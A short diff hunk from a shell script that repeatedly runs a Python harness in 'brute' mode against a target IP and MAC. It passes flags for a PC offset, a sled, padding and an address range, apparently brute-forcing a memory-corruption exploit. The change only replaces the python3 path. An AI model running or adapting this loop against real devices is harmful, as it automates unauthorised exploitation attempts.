@@ -75,7 +75,7 @@ while :; do
     mkdir -p /tmp/pane1 && echo 0 >"/tmp/pane1/brute.$ip.idx"
     log "present at $ip — batch from $(printf 0x%x "$ADDR")"
     before=$(wc -l <"$LOG" 2>/dev/null || echo 0)
-    sudo -n python3 "$HARNESS" brute --host "$ip" --offset "$PC_OFFSET" --sled 0 --padpc 1 \
+    sudo -n /opt/homebrew/bin/python3 "$HARNESS" brute --host "$ip" --offset "$PC_OFFSET" --sled 0 --padpc 1 \
       --sledfill --pcround 0x1000 --addr "$ADDR" --count "$BATCH" --step "$STEP" \
       --hang --mac "$MAC" >>"$LOG" 2>&1
     rc=$?
